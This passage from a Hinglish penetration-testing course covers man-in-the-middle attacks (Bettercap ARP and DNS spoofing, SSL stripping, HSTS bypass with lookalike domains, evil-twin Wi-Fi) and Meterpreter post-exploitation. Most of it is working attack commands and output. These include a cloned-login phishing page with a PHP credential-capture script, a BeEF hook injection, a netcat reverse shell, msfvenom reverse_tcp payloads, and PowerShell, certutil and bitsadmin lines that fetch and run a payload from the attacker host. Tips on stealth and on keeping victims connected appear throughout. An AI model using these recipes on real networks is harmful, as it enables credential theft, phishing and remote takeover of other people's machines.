# Enable SSL stripping
192.168.1.100 ¬ª set http.proxy.sslstrip true

# Start HTTP proxy
192.168.1.100 ¬ª http.proxy on

# Output:
[14:32:00] [sys] ¬ª http.proxy starting HTTP proxy on 0.0.0.0:8080
[14:32:00] [sys] ¬ª http.proxy HTTP proxy started
[14:32:00] [sys] ¬ª http.proxy SSL stripping enabled
```

**Step 6: Capture Credentials**
```bash
# Enable verbose sniffing
192.168.1.100 ¬ª set net.sniff.verbose true
192.168.1.100 ¬ª set net.sniff.local true
192.168.1.100 ¬ª net.sniff on

# When victim browses:
[14:33:15] [endpoint] ¬ª 192.168.1.20 > GET http://example.com/
[14:33:20] [endpoint] ¬ª 192.168.1.20 > POST http://example.com/login
[14:33:20] [credentials] ¬ª username=john.smith&password=MyPassword123!

# Credentials captured!
```

**Scenario 2: Using Bettercap Caplets (Scripts)**

**Step 1: Create Custom Caplet**
```bash
# Create caplet file
nano mitm-attack.cap
# nano: Text editor (file create/edit karta hai)
# mitm-attack.cap: Caplet filename (Bettercap script)

# Content:
# Enable network discovery
net.probe on

# Set target
set arp.spoof.targets 192.168.1.20

# Start ARP spoofing
arp.spoof on

# Enable SSL stripping
set http.proxy.sslstrip true
http.proxy on

# Enable sniffing
set net.sniff.verbose true
net.sniff on

# Log to file
set net.sniff.output /root/captured.pcap

# Save caplet
```

**Step 2: Run Caplet**
```bash
# Execute caplet
sudo bettercap -iface eth0 -caplet mitm-attack.cap
# -caplet: Caplet file execute karta hai
# mitm-attack.cap: Script file jisme commands hain

# All commands execute automatically!
# No manual typing needed
```

**Scenario 3: Bettercap Web UI**

**Step 1: Start Web UI**
```bash
# Start bettercap with web UI
sudo bettercap -iface eth0

# In bettercap console:
192.168.1.100 ¬ª http-ui
# http-ui: Web-based UI module start karta hai
# Browser se access kar sakte hain

# Output:
[14:35:00] [sys] ¬ª http-ui starting web UI on https://0.0.0.0:80
[14:35:00] [sys] ¬ª http-ui web UI started
[14:35:00] [sys] ¬ª http-ui username: admin
[14:35:00] [sys] ¬ª http-ui password: pass
```

**Step 2: Access Web UI**
```bash
# Open browser
firefox https://192.168.1.100
# firefox: Browser open karta hai
# https://192.168.1.100: Bettercap web UI ka URL

# Login:
Username: admin
Password: pass

# Web UI shows:
- Network map (visual)
- Active hosts
- Traffic statistics
- Attack modules
- Real-time logs
```

**Step 3: Launch Attack from Web UI**
```
1. Click "Modules" tab
2. Enable "arp.spoof"
3. Set target: 192.168.1.20
4. Click "Start"
5. Enable "http.proxy"
6. Enable "net.sniff"
7. Monitor "Events" tab for captured data

# All attacks managed from browser!
```

### üí° Pro Tip / Galti:

**Pro Tip**: Use Bettercap caplets for repeatable attacks:

```bash
# Create caplet library
mkdir ~/bettercap-caplets
# mkdir: Directory create karta hai
# ~/bettercap-caplets: Home directory mein folder

# Caplet 1: Quick MITM
cat > ~/bettercap-caplets/quick-mitm.cap << 'EOF'
# cat >: File mein content write karta hai
# << 'EOF': Here document (multi-line input)
# EOF tak ka content file mein jayega
set arp.spoof.targets 192.168.1.20
arp.spoof on
set http.proxy.sslstrip true
http.proxy on
net.sniff on
EOF

# Caplet 2: Stealth mode
cat > ~/bettercap-caplets/stealth.cap << 'EOF'
set arp.spoof.targets 192.168.1.20
set arp.spoof.internal false
arp.spoof on
set net.sniff.verbose false
net.sniff on
set net.sniff.output /tmp/capture.pcap
EOF

# Caplet 3: Full attack
cat > ~/bettercap-caplets/full-attack.cap << 'EOF'
net.probe on
set arp.spoof.targets 192.168.1.0/24
arp.spoof on
set http.proxy.sslstrip true
http.proxy on
set dns.spoof.domains *.com
dns.spoof on
net.sniff on
EOF

# Use caplets:
sudo bettercap -iface eth0 -caplet ~/bettercap-caplets/quick-mitm.cap

# Benefits:
# - Repeatable attacks
# - No manual commands
# - Easy to share
# - Version control friendly
```

**Common Mistake**: Not setting targets correctly:

```
‚ùå Bad: No target specified
> arp.spoof on
# Spoofs entire network ‚Üí Network chaos

‚úì Good: Specific target
> set arp.spoof.targets 192.168.1.20
> arp.spoof on
# Only affects one host ‚Üí Controlled attack

Better: Multiple specific targets
> set arp.spoof.targets 192.168.1.20,192.168.1.30,192.168.1.40
> arp.spoof on
# Affects only selected hosts ‚Üí Precise attack
```

---

## üìö Topic 9.4: Attack - HSTS Bypass (Bettercap Caplet)

### üéØ Topic/Technique:
**HSTS Bypass** - HTTP Strict Transport Security ko bypass karke HTTPS downgrade attack perform karna.

### ü§î Yeh Kya Hai?
HSTS (HTTP Strict Transport Security) ek security mechanism hai jo browser ko force karta hai ki woh hamesha HTTPS use kare for specific domain. HSTS bypass attack mein attacker similar-looking domain use karta hai jo HSTS list mein nahi hai, aur victim ko HTTP version par redirect karta hai jahan SSL stripping kaam karti hai.

**Example:**
```
Real domain: facebook.com (HSTS enabled)
Bypass domain: faceboook.com (extra 'o', no HSTS)
Victim types: facebook.com
Attacker redirects: faceboook.com (HTTP)
Victim doesn't notice typo
Credentials captured!
```

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Demonstrates HSTS limitations
- Tests user awareness
- Bypasses SSL/TLS protection
- Shows importance of certificate validation
- Realistic attack vector
- Combines multiple techniques

### üéØ Practical Use (Asli Pentesting Mein):
- Bypassing HTTPS-only sites
- Credential harvesting on secure sites
- Demonstrating SSL/TLS weaknesses
- Testing browser security
- Red Team operations

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Normal HSTS:**
```
1. User types: facebook.com
2. Browser checks HSTS list
3. facebook.com is in list
4. Browser forces HTTPS
5. SSL stripping fails
```

**HSTS Bypass:**
```
1. User types: facebook.com
2. DNS spoof redirects to: faceboook.com
3. Browser checks HSTS list
4. faceboook.com NOT in list
5. Browser allows HTTP
6. SSL stripping works!
7. Credentials captured
```

### üëç Pros (Fayde):
- Bypasses HSTS protection
- Works on major websites
- High success rate
- Combines DNS + SSL stripping
- Difficult to detect

### üëé Cons (Nuksaan):
- Requires DNS spoofing
- Users may notice domain typo
- Certificate warnings (if HTTPS attempted)
- Requires MITM position
- Modern browsers show warnings

### ‚å®Ô∏è Zaroori Commands & Steps:

**Bettercap HSTS Bypass Caplet:**
```bash
# hsts-bypass.cap
set arp.spoof.targets 192.168.1.20
arp.spoof on

set http.proxy.sslstrip true
set http.proxy.script hsts-bypass.js
http.proxy on

set dns.spoof.domains facebook.com,*.facebook.com
set dns.spoof.address 192.168.1.100
dns.spoof on

net.sniff on
```

**HSTS Bypass JavaScript:**
```javascript
// hsts-bypass.js
function onRequest(req, res) {
    // Replace HSTS domains with similar domains
    if(req.Hostname.includes('facebook.com')) {
        req.Hostname = req.Hostname.replace('facebook.com', 'faceboook.com');
    }
    if(req.Hostname.includes('google.com')) {
        req.Hostname = req.Hostname.replace('google.com', 'gooogle.com');
    }
}
```

### üíª Step-by-Step Example:

**Scenario: HSTS Bypass on Facebook**

**Step 1: Setup Bettercap**
```bash
sudo bettercap -iface eth0

# Enable ARP spoofing
> set arp.spoof.targets 192.168.1.20
> arp.spoof on
```

**Step 2: Configure DNS Spoofing**
```bash
# Spoof facebook.com to attacker IP
> set dns.spoof.domains facebook.com,*.facebook.com
> set dns.spoof.address 192.168.1.100
> dns.spoof on

# Output:
[sys] dns.spoof DNS spoofer started
[sys] dns.spoof facebook.com ‚Üí 192.168.1.100
```

**Step 3: Setup HTTP Proxy with HSTS Bypass**
```bash
# Enable SSL stripping
> set http.proxy.sslstrip true

# Load HSTS bypass script
> set http.proxy.script /root/hsts-bypass.js

# Start proxy
> http.proxy on

# Output:
[sys] http.proxy HTTP proxy started on 0.0.0.0:8080
[sys] http.proxy SSL stripping enabled
[sys] http.proxy script loaded: hsts-bypass.js
```

**Step 4: Victim Attempts to Visit Facebook**
```
Victim's browser:
1. Types: facebook.com
2. DNS query sent
3. Attacker's DNS spoof responds: 192.168.1.100
4. Browser connects to attacker
5. Attacker's proxy intercepts
6. Proxy redirects to: faceboook.com (HTTP)
7. Browser loads HTTP version (no HSTS for faceboook.com)
8. Victim sees Facebook login page
9. Victim enters credentials
10. Credentials sent over HTTP
11. Attacker captures credentials
```

**Step 5: Captured Credentials**
```bash
# Bettercap output:
[14:45:30] [endpoint] 192.168.1.20 > POST http://faceboook.com/login
[14:45:30] [credentials] email=victim@email.com&pass=MyPassword123!

# Success! Facebook credentials captured despite HSTS
```

### üí° Pro Tip / Galti:

**Pro Tip**: Use homograph attacks for better HSTS bypass:

```
Instead of adding extra letters, use similar-looking characters:

facebook.com ‚Üí facebŒøŒøk.com (Greek omicron 'Œø' instead of 'o')
google.com ‚Üí gŒøŒøgle.com
amazon.com ‚Üí amazŒøn.com

Benefits:
- Looks identical to victim
- Bypasses HSTS
- No certificate for homograph domain
- Very difficult to detect visually

Implementation:
> set dns.spoof.domains facebook.com
> set dns.spoof.address 192.168.1.100
> dns.spoof on

# Serve fake page on facebŒøŒøk.com (with Greek characters)
```

**Common Mistake**: Not handling HTTPS redirects:

```
‚ùå Bad: Only DNS spoofing
# Victim may still see HTTPS redirect
# Browser shows certificate error
# Attack fails

‚úì Good: DNS + HTTP proxy + SSL stripping
# Complete MITM setup
# Handles all redirects
# Smooth attack flow
```

---

## üìö Topic 9.5: Attack - DNS Spoofing (Bettercap)

### üéØ Topic/Technique:
**DNS Spoofing** - DNS queries ko intercept karke fake IP addresses return karna.

### ü§î Yeh Kya Hai?
DNS spoofing mein attacker victim ke DNS queries ko intercept karta hai aur fake responses bhejta hai. Jab victim koi website visit karta hai (e.g., google.com), attacker fake IP address return karta hai jo attacker ke control mein hai. Victim attacker ke fake website par land karta hai, thinking it's the real site.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Demonstrates DNS vulnerabilities
- Credential harvesting
- Phishing attacks
- Traffic redirection
- Malware delivery
- Tests DNS security

### üéØ Practical Use (Asli Pentesting Mein):
- Phishing campaigns
- Credential harvesting
- Traffic analysis
- Malware distribution
- Network security assessment

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Normal DNS:**
```
Victim: "What's the IP of google.com?"
DNS Server: "google.com is 142.250.185.46"
Victim connects to: 142.250.185.46 (real Google)
```

**DNS Spoofing:**
```
Victim: "What's the IP of google.com?"
Attacker intercepts query
Attacker responds: "google.com is 192.168.1.100" (attacker's IP)
Victim connects to: 192.168.1.100 (fake Google)
```

### üëç Pros (Fayde):
- Redirects any domain
- Works with MITM
- Transparent to victim
- Can target specific domains
- Effective for phishing

### üëé Cons (Nuksaan):
- Requires MITM position
- HTTPS shows certificate errors
- DNSSEC prevents spoofing
- Can be detected
- Requires fake website setup

### ‚å®Ô∏è Zaroori Commands & Steps:

**Bettercap DNS Spoofing:**
```bash
# Spoof specific domain
> set dns.spoof.domains google.com
# dns.spoof.domains: Kon se domains spoof karne hain
> set dns.spoof.address 192.168.1.100
# dns.spoof.address: Fake IP address (attacker ka IP)
> dns.spoof on
# dns.spoof: DNS spoofing module start karta hai

# Spoof multiple domains
> set dns.spoof.domains google.com,facebook.com,*.amazon.com
# Comma-separated list of domains
# *: Wildcard (all subdomains)
> dns.spoof on

# Spoof all domains
> set dns.spoof.all true
# dns.spoof.all: Sabhi domains spoof karta hai
> dns.spoof on
```

### üíª Step-by-Step Example:

**Scenario: DNS Spoofing to Fake Login Page**

**Step 1: Create Fake Website**
```bash
# Clone real website
wget -r -l 1 https://www.facebook.com
# wget: File download karta hai
# -r: Recursive (linked files bhi download)
# -l 1: Level 1 depth (only main page + 1 level)
mv www.facebook.com /var/www/html/fake-facebook
# mv: Move/rename karta hai (downloaded folder ko web directory mein)

# Modify login form
nano /var/www/html/fake-facebook/index.html
# nano: Text editor se file edit karo
# Change form action to: action="capture.php"
# Form submit hone par capture.php run hoga

# Create capture script
cat > /var/www/html/fake-facebook/capture.php << 'EOF'
# PHP script create karta hai
<?php
$email = $_POST['email'];
# $_POST['email']: Form se email value get karta hai
$pass = $_POST['pass'];
# $_POST['pass']: Form se password value get karta hai
file_put_contents('captured.txt', "Email: $email\nPass: $pass\n\n", FILE_APPEND);
# file_put_contents: File mein data write karta hai
# FILE_APPEND: Existing content ke end mein add karta hai
header('Location: https://www.facebook.com');
# header: HTTP redirect karta hai (real Facebook par)
?>
EOF

# Start web server
service apache2 start
# service: System service manage karta hai
# apache2 start: Apache web server start karta hai
```

**Step 2: Setup Bettercap**
```bash
sudo bettercap -iface eth0

# ARP spoofing
> set arp.spoof.targets 192.168.1.20
> arp.spoof on

# DNS spoofing
> set dns.spoof.domains facebook.com,*.facebook.com
> set dns.spoof.address 192.168.1.100
> dns.spoof on
```

**Step 3: Victim Visits Facebook**
```
1. Victim types: facebook.com
2. DNS query intercepted
3. Attacker responds: 192.168.1.100
4. Victim's browser loads fake Facebook
5. Victim enters credentials
6. Credentials saved to captured.txt
7. Victim redirected to real Facebook
8. Victim thinks: "Maybe I mistyped password"
```

**Step 4: Check Captured Credentials**
```bash
cat /var/www/html/fake-facebook/captured.txt

# Output:
Email: victim@email.com
Pass: MyPassword123!
```

### üí° Pro Tip / Galti:

**Pro Tip**: Combine DNS spoofing with BeEF:

```bash
# Inject BeEF hook in fake website
<script src="http://192.168.1.100:3000/hook.js"></script>

# Benefits:
# - Victim visits fake site
# - Browser gets hooked
# - Even if victim leaves site
# - You maintain browser control
# - Can run additional attacks
```

**Common Mistake**: Spoofing HTTPS sites without SSL:

```
‚ùå Bad: DNS spoof HTTPS site, serve HTTP
# Browser shows certificate error
# Victim suspicious

‚úì Good: Use SSL stripping + DNS spoofing
# Downgrade to HTTP smoothly
# No certificate errors
# Better success rate
```

---

## üìö Topic 9.6: Tool - Wireshark (Packet Sniffing)

### üéØ Topic/Technique:
**Wireshark** - Network packet analyzer jo traffic capture aur analyze karta hai.

### ü§î Yeh Kya Hai?
Wireshark ek powerful network protocol analyzer hai jo network traffic ko capture karke detailed analysis provide karta hai. Yeh har packet ko decode karta hai aur human-readable format mein dikhata hai. Pentesters isko use karte hain credentials capture karne, network issues debug karne, aur traffic patterns analyze karne ke liye.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Traffic analysis
- Credential capture
- Protocol analysis
- Network troubleshooting
- Malware analysis
- Forensics investigation

### üéØ Practical Use (Asli Pentesting Mein):
- Capturing credentials
- Analyzing encrypted traffic
- Finding vulnerabilities
- Network mapping
- Session hijacking
- Data exfiltration detection

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Wireshark Process:**
```
1. Captures packets from network interface
2. Decodes protocols (HTTP, DNS, TCP, etc.)
3. Displays in readable format
4. Allows filtering and searching
5. Exports data for analysis
```

### üëç Pros (Fayde):
- Powerful packet analysis
- Supports 1000+ protocols
- Real-time capture
- Advanced filtering
- Export capabilities
- Cross-platform

### üëé Cons (Nuksaan):
- Can't decrypt HTTPS (without keys)
- Overwhelming for beginners
- Requires promiscuous mode
- Large capture files
- Performance impact

### ‚å®Ô∏è Zaroori Commands & Steps:

**Wireshark Filters:**
```bash
# HTTP traffic
http
# http: Only HTTP protocol packets show karta hai

# Specific IP
ip.addr == 192.168.1.20
# ip.addr: Source ya destination IP filter karta hai
# ==: Equals operator

# HTTP POST (credentials)
http.request.method == "POST"
# http.request.method: HTTP method filter karta hai
# "POST": Login forms usually POST method use karte hain

# DNS queries
dns
# dns: Only DNS protocol packets show karta hai

# Follow TCP stream
tcp.stream eq 0
# tcp.stream: TCP connection follow karta hai
# eq 0: Stream number 0 (first connection)
```

### üíª Step-by-Step Example:

**Scenario: Capturing HTTP Credentials**

**Step 1: Start Wireshark**
```bash
sudo wireshark

# Select interface: eth0
# Network interface select karo jahan traffic capture karna hai
# Click: Start capturing
# Packet capture start ho jayega
```

**Step 2: Apply Filter**
```bash
# Filter for HTTP POST
http.request.method == "POST"
# Display filter apply karo (only POST requests)

# Only shows login attempts
# POST requests mein usually credentials hote hain
```

**Step 3: Victim Logs In**
```
Victim visits: http://example.com/login
Enters: username=admin, password=secret123
```

**Step 4: Analyze Packet**
```
Wireshark shows:
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=secret123

# Credentials captured!
```

### üí° Pro Tip / Galti:

**Pro Tip**: Use Wireshark with MITM for better results:

```bash
# Step 1: MITM attack (Bettercap)
sudo bettercap -iface eth0
> set arp.spoof.targets 192.168.1.20
> arp.spoof on

# Step 2: Capture with Wireshark
sudo wireshark -i eth0 -f "host 192.168.1.20"
# -i eth0: Interface specify karta hai
# -f: Capture filter apply karta hai
# "host 192.168.1.20": Only victim's traffic capture karta hai

# Now you see ALL victim's traffic!
# MITM + Wireshark = Complete traffic visibility
```

**Common Mistake**: Not using filters:

```
‚ùå Bad: Capture everything
# 10,000+ packets in 1 minute
# Impossible to analyze

‚úì Good: Use specific filters
http.request.method == "POST" and ip.addr == 192.168.1.20
# Only relevant packets
# Easy analysis
```

---

## üìö Topic 9.7: Attack - Fake Access Point (Honeypot)

### üéØ Topic/Technique:
**Fake Access Point** - Rogue WiFi hotspot create karke victims ko connect karwana.

### ü§î Yeh Kya Hai?
Fake Access Point (Evil Twin) mein attacker ek fake WiFi hotspot create karta hai jo legitimate network jaisa dikhta hai. Victims connect karte hain thinking it's real, aur attacker unka saara traffic intercept kar leta hai. Common in public places like airports, cafes, hotels.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Tests wireless security
- Demonstrates public WiFi risks
- Credential harvesting
- MITM attacks
- User awareness testing

### üéØ Practical Use (Asli Pentesting Mein):
- Wireless penetration testing
- Social engineering
- Credential harvesting
- Network security assessment
- Red Team operations

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Attack Flow:**
```
1. Attacker creates fake AP: "Starbucks_WiFi"
2. Victim sees two networks:
   - Starbucks_WiFi (real)
   - Starbucks_WiFi (fake - stronger signal)
3. Victim connects to fake AP
4. Attacker intercepts all traffic
5. Credentials captured
```

### üëç Pros (Fayde):
- Easy to setup
- High success rate
- Works in public places
- Captures all traffic
- Difficult to detect

### üëé Cons (Nuksaan):
- Requires WiFi adapter
- Limited range
- May be illegal
- Can be detected by tools
- Requires physical presence

### ‚å®Ô∏è Zaroori Commands & Steps:

**Create Fake AP:**
```bash
# Using hostapd
apt-get install hostapd dnsmasq
# hostapd: Access Point create karta hai
# dnsmasq: DHCP + DNS server (clients ko IP assign karta hai)

# Configure hostapd
cat > /etc/hostapd/hostapd.conf << 'EOF'
# Configuration file create karta hai
interface=wlan0
# interface: Wireless interface specify karta hai
driver=nl80211
# driver: WiFi driver (nl80211 = standard Linux driver)
ssid=Free_WiFi
# ssid: Network name (jo victims ko dikhega)
channel=6
# channel: WiFi channel (1-11)
EOF

# Start AP
hostapd /etc/hostapd/hostapd.conf
# hostapd: Access Point start karta hai with config file

### üíª Step-by-Step Example:

**Scenario: Fake Starbucks WiFi**

**Step 1: Setup Fake AP**
```bash
# Create AP named "Starbucks_WiFi"
hostapd /etc/hostapd/starbucks.conf
# hostapd: Fake AP start karta hai (Starbucks WiFi naam se)

# Configure DHCP
dnsmasq -C /etc/dnsmasq.conf
# dnsmasq: DHCP server start karta hai
# -C: Configuration file specify karta hai
# Clients ko automatically IP assign karega

# Enable forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
# IP forwarding enable karta hai (internet access ke liye)
```

**Step 2: Captive Portal**
```bash
# Redirect all HTTP to login page
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
# iptables: Firewall rule add karta hai
# -t nat: NAT table
# -A PREROUTING: PREROUTING chain mein rule add
# -p tcp: TCP protocol
# --dport 80: Destination port 80 (HTTP)
# -j DNAT: Destination NAT (redirect)
# --to-destination 192.168.1.1:80: Attacker ke web server par redirect

# Serve fake login page
apache2 start
# apache2: Web server start karta hai (fake login page serve karega)
```

**Step 3: Victim Connects**
```
1. Victim sees: "Starbucks_WiFi"
2. Connects (no password)
3. Browser opens
4. Redirected to fake login
5. Enters email/password
6. Credentials captured
7. Internet access granted
```

### üí° Pro Tip / Galti:

**Pro Tip**: Make fake AP more convincing:

```bash
# Use exact same SSID as real network
# Use stronger signal (closer to victims)
# Add captive portal (looks official)
# Provide actual internet (via tethering)
# Monitor for high-value targets

# Benefits:
# - Higher success rate
# - Less suspicious
# - Longer connection time
# - More data captured
```

**Common Mistake**: No internet access:

```
‚ùå Bad: Fake AP with no internet
# Victims connect
# No internet
# Victims disconnect immediately
# Attack fails

‚úì Good: Fake AP with internet
# Victims connect
# Internet works
# Victims stay connected
# More time to capture data
```

---

**üéâ Module 9 Complete! üéâ**

**Topics Covered:**
‚úÖ 9.1: Netdiscover & Zenmap
‚úÖ 9.2: ARP Spoofing
‚úÖ 9.3: Bettercap
‚úÖ 9.4: HSTS Bypass
‚úÖ 9.5: DNS Spoofing
‚úÖ 9.6: Wireshark
‚úÖ 9.7: Fake Access Point

**Key Takeaways:**
- Network-level attacks bypass application security
- MITM attacks are powerful for credential harvesting
- Bettercap is modern all-in-one MITM framework
- Public WiFi is dangerous (fake APs)
- Always use HTTPS + VPN on untrusted networks

**Next Module:** Module 10 - Post-Exploitation (Meterpreter)

=============================================================

# üéØ Module 10: Post-Exploitation (Meterpreter)

---

## üìö Topic 10.1: Upgrading Shell (Basic to Meterpreter)

### üéØ Topic/Technique:
**Shell Upgrading** - Basic command shell ko powerful Meterpreter session mein convert karna.

### ü§î Yeh Kya Hai?
Jab aap initially system compromise karte hain, aapko basic command shell milta hai (cmd.exe ya /bin/bash). Yeh shell limited functionality provide karta hai. Meterpreter ek advanced payload hai jo bahut zyada features provide karta hai - file upload/download, screenshot, keylogging, privilege escalation, etc. Shell upgrading ka matlab hai basic shell ko Meterpreter mein convert karna for better control.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Advanced post-exploitation features
- Better session management
- Stealth capabilities
- Multiple attack modules
- Easier privilege escalation
- Professional pentesting tool

### üéØ Practical Use (Asli Pentesting Mein):
- Converting basic shells to Meterpreter
- Gaining advanced control
- Post-exploitation activities
- Privilege escalation
- Lateral movement
- Data exfiltration

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Upgrade Process:**
```
1. Get basic shell (netcat, PHP shell, etc.)
2. Upload Meterpreter payload
3. Execute payload
4. Meterpreter session opens
5. Background basic shell
6. Use Meterpreter features
```

### üëç Pros (Fayde):
- Advanced features (200+ commands)
- In-memory execution (no disk writes)
- Encrypted communication
- Session management
- Modular architecture
- Active development

### üëé Cons (Nuksaan):
- Larger payload size
- May be detected by AV/EDR
- Requires Metasploit framework
- Network traffic may be suspicious
- Requires stable connection

### ‚å®Ô∏è Zaroori Commands & Steps:

**Method 1: Using shell_to_meterpreter Module**
```bash
# In Metasploit with existing shell session
use post/multi/manage/shell_to_meterpreter
# use: Module load karta hai
# post/multi/manage/shell_to_meterpreter: Shell ko Meterpreter mein convert karta hai
set SESSION 1
# set SESSION: Kon sa session upgrade karna hai (session ID)
set LHOST 192.168.1.100
# set LHOST: Attacker ka IP (jahan Meterpreter connect karega)
run
# run: Module execute karta hai

# Automatically upgrades shell to Meterpreter
# Payload upload, execute, aur session open - sab automatic
```

**Method 2: Manual Upload**
```bash
# Generate Meterpreter payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o upgrade.exe
# msfvenom: Payload generator tool
# -p: Payload type specify karta hai
# windows/meterpreter/reverse_tcp: Windows Meterpreter reverse connection
# LHOST: Attacker ka IP address
# LPORT: Attacker ka port number
# -f exe: Output format (executable file)
# -o upgrade.exe: Output filename

# In basic shell, upload payload
# Various methods: PowerShell, certutil, wget, etc.
# Execute payload
# Payload run hone par Meterpreter session open hoga
# New Meterpreter session opens
```

### üíª Step-by-Step Example:

**Scenario: Upgrading Netcat Shell to Meterpreter**

**Step 1: Get Basic Shell**
```bash
# Victim executes: nc -e cmd.exe 192.168.1.100 4444
# nc: Netcat tool
# -e cmd.exe: Execute cmd.exe (command shell)
# 192.168.1.100: Attacker ka IP
# 4444: Attacker ka port

# Attacker receives shell
nc -lvnp 4444
# nc: Netcat listener start karta hai
# -l: Listen mode (connections accept karta hai)
# -v: Verbose (detailed output)
# -n: No DNS resolution (faster)
# -p 4444: Port 4444 par listen karta hai

# Basic shell:
C:\Users\victim>
# Simple command prompt (limited features)
```

**Step 2: Background Shell and Setup Metasploit**
```bash
# Press Ctrl+Z to background netcat
# Ctrl+Z: Process ko background mein bhej deta hai

# Start Metasploit
msfconsole
# msfconsole: Metasploit Framework console start karta hai

# Setup handler for Meterpreter
use exploit/multi/handler
# use: Module select karta hai
# exploit/multi/handler: Generic payload handler (incoming connections accept karta hai)
set payload windows/meterpreter/reverse_tcp
# set payload: Payload type specify karta hai
# windows/meterpreter/reverse_tcp: Windows Meterpreter reverse connection
set LHOST 192.168.1.100
# LHOST: Local host (attacker ka IP jahan connection aayega)
set LPORT 5555
# LPORT: Local port (jis port par listen karega)
exploit -j
# exploit: Handler start karta hai
# -j: Job mode (background mein run hoga)
```

**Step 3: Upload Meterpreter Payload**
```bash
# Generate payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=5555 -f exe -o met.exe
# msfvenom: Payload generator
# -p: Payload type
# LHOST/LPORT: Attacker ka IP aur port
# -f exe: Executable format
# -o met.exe: Output file

# In basic shell (foreground netcat with fg)
# fg: Foreground command (background process ko wapas active karta hai)
# Upload via various methods:

# Method A: PowerShell download
powershell -c "(New-Object Net.WebClient).DownloadFile('http://192.168.1.100/met.exe','C:\temp\met.exe')"
# powershell: PowerShell execute karta hai
# -c: Command execute karta hai
# New-Object Net.WebClient: Web client object create karta hai
# DownloadFile: File download karta hai (source URL, destination path)

# Method B: Certutil
certutil -urlcache -f http://192.168.1.100/met.exe C:\temp\met.exe
# certutil: Windows certificate utility (file download ke liye abuse kiya jata hai)
# -urlcache: URL cache use karta hai
# -f: Force download (cache ignore karta hai)

# Method C: BITSAdmin
bitsadmin /transfer myDownload http://192.168.1.100/met.exe C:\temp\met.exe
# bitsadmin: Background Intelligent Transfer Service
# /transfer: File transfer karta hai
# myDownload: Job name
```

**Step 4: Execute Meterpreter**
```bash
# In basic shell
C:\temp\met.exe
# Payload execute karta hai (Meterpreter start hoga)

# Metasploit handler catches session:
[*] Sending stage (200262 bytes) to 192.168.1.20
# Stage: Meterpreter DLL victim ko send ho raha hai
[*] Meterpreter session 1 opened
# Session successfully open ho gaya

# Now you have Meterpreter!
meterpreter >
# Meterpreter prompt (advanced features available)
```

**Step 5: Verify Upgrade**
```bash
meterpreter > sysinfo
# sysinfo: System information display karta hai
Computer        : VICTIM-PC
OS              : Windows 10 (10.0 Build 19044)
Architecture    : x64
System Language : en_US
Meterpreter     : x86/windows

meterpreter > getuid
# getuid: Current user ID display karta hai
Server username: VICTIM-PC\user
# Current logged-in user

# Successfully upgraded!
# Basic shell se Meterpreter mein successfully convert ho gaya
```

### üí° Pro Tip / Galti:

**Pro Tip**: Use shell_to_meterpreter module for automatic upgrade:

```bash
# Much easier than manual method!

# Step 1: Get any shell (netcat, PHP, etc.)
# Koi bhi basic shell (command line access)
# Step 2: In Metasploit:
sessions -l  # List sessions
# sessions: Active sessions display karta hai
# -l: List format mein
use post/multi/manage/shell_to_meterpreter
# Automatic upgrade module
set SESSION 1
# SESSION: Kon sa session upgrade karna hai (ID number)
set LHOST 192.168.1.100
# LHOST: Attacker ka IP (Meterpreter yahan connect karega)
run
# Module execute karta hai

# Automatically:
# - Uploads Meterpreter
# - Executes it
# - Opens new session
# - No manual work needed!
```

**Common Mistake**: Wrong architecture payload:

```
‚ùå Bad: x86 payload on x64 system
# May crash or not work properly

‚úì Good: Match architecture
# Check system first:
wmic os get osarchitecture
# wmic: Windows Management Instrumentation Command
# os get osarchitecture: Operating system architecture check karta hai (x86 ya x64)
# Then generate matching payload:
msfvenom -p windows/x64/meterpreter/reverse_tcp ...
# x64 payload for 64-bit system (architecture match karna zaroori hai)
```

---

## üìö Topic 10.2: Basic Commands (sysinfo, getuid, sessions)

### üéØ Topic/Technique:
**Meterpreter Basic Commands** - Essential commands for system information aur session management.

### ü§î Yeh Kya Hai?
Meterpreter mein 200+ commands hain. Basic commands wo hain jo aap sabse pehle use karte hain - system information gather karna, user privileges check karna, aur sessions manage karna. Yeh commands foundation hain advanced post-exploitation ke liye.

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Essential Commands:**
```bash
# System Information
sysinfo          # OS, architecture, computer name
# System ki complete details (OS version, architecture, hostname)
getuid           # Current user
# Kon sa user logged in hai (privileges check karne ke liye)
getpid           # Current process ID
# Current process ka ID (migration ke liye useful)
ps               # Running processes
# Sabhi running processes list karta hai

# Session Management
background       # Background current session
# Session ko background mein bhej deta hai (Ctrl+Z ki tarah)
sessions -l      # List all sessions
# Sabhi active sessions display karta hai
sessions -i 1    # Interact with session 1
# Specific session ke saath interact karta hai (session ID se)

# File System
pwd              # Current directory
# Present working directory (current location)
ls               # List files
# Files aur folders list karta hai
cd               # Change directory
# Directory change karta hai
cat              # Read file
# File content display karta hai
download         # Download file
# Victim se attacker machine par file download karta hai
upload           # Upload file
# Attacker se victim machine par file upload karta hai

# Network
ipconfig         # Network configuration
# Network interfaces aur IP addresses display karta hai
route            # Routing table
# Network routing information
arp              # ARP table
# ARP cache (IP to MAC mapping)

### üíª Step-by-Step Example:

**Scenario: Initial Reconnaissance**

```bash
# Get system info
meterpreter > sysinfo
# sysinfo: Complete system information display karta hai
Computer        : VICTIM-PC
# Computer name
OS              : Windows 10 (10.0 Build 19044)
# Operating system version
Architecture    : x64
# 64-bit system
System Language : en_US
# System language
Domain          : WORKGROUP
# Domain ya workgroup
Logged On Users : 2
# Kitne users logged in hain
Meterpreter     : x86/windows
# Meterpreter payload type

# Check current user
